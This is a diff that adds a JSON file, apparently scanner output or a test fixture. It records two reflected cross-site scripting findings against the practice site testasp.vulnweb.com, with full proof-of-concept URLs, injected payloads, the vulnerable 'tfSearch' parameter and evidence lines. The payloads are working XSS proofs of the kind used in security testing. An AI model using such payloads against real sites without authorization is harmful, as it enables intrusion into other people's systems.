@@ -1,0 +1,29 @@
+[
+  {
+    "type": "V",
+    "inject_type": "inHTML-URL",
+    "poc_type": "plain",
+    "method": "GET",
+    "data": "http://testasp.vulnweb.com/Search.asp?tfSearch=%3Csvg%2Fonload%3Dalert%28document.domain%29%3E",
+    "param": "tfSearch",
+    "payload": "<svg/onload=alert(document.domain)>",
+    "evidence": "12 line:  <input type=\"text\" name=\"tfSearch\" value=\"<svg/onload=alert(document.domain)>\">",
+    "cwe": "CWE-79",
+    "severity": "High",
+    "message_id": 1,
+    "message_str": "Triggered XSS Payload (found dom objects)"
+  },
+  {
+    "type": "V",
+    "inject_type": "inJS-URL",
+    "poc_type": "plain",
+    "method": "GET",
+    "data": "http://testasp.vulnweb.com/Search.asp?tfSearch=%22%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E",
+    "param": "tfSearch",
+    "payload": "\"><script>alert(1)</script>",
+    "evidence": "48 line:  var searchTerm = \"\"><script>alert(1)</script>\";",
+    "cwe": "CWE-79",
+    "severity": "High",
+    "message_id": 2,
+    "message_str": "Triggered XSS Payload (found dom objects)"
+  }
